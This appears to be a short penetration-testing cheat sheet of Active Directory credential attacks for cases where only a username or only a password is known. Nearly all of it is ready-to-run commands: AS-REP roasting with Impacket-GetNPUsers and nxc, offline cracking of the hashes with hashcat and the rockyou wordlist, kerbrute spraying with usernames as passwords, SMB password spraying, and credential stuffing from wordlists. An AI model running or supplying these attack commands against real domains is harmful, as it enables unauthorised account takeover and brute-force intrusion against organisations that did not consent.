# One Credential Only

##  Username

### 1) ASREProasting 

Do ASREProasting

    Impacket-GetNPUsers domain/ -usersfile usernames.txt -format hashcat -dc-ip DC_IP -dc-host dc.domain.local -outputfile asreproasted.txt -request
    
    Impacket-GetNPUsers domain/user -format hashcat -dc-ip DC_IP -dc-host dc.domain.local -outputfile asreproasted.txt -request

    nxc ldap domain.local -u user -p pass --kdcHost DC_IP --asrep

Crack Hash

    hashcat -m 18200 -a 0 asreproasted.txt /usr/share/wordlists/rockyou.txt

### 2) Password Attack

Do a password attack by using username as password

    kerbrute passwordspray -d domain.local --dc dc.domain.local --user-as-pass users.txt

## Password

### 1) Password Spray

Use a single password against different users

    nxc smb domain.local -u users.txt -p Password123! --continue-on-success

## Both (Verification Methods)

### 1) Credential Stuffing

Do a credential stuffing attack using the username and password wordlists you have created

    nxc smb domain.local -u users.txt -p passwords.txt

Test user=password (1 line per test)

    nxc smb domain.local -u users.txt -p passwords.txt --no-bruteforce
